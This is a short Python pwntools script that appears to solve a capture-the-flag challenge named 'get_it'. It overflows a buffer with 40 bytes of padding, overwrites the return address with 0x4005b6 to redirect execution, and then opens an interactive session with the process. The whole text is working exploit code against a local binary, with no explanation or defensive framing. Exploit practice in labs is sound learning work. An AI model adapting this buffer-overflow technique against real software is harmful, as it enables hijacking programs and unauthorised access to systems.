#!/usr/bin/python3

from pwn import *

payload = b'A'*40
payload += p64(0x4005b6)

target = process('./get_it')

print(target.recvline())
target.sendline(payload)
target.interactive()
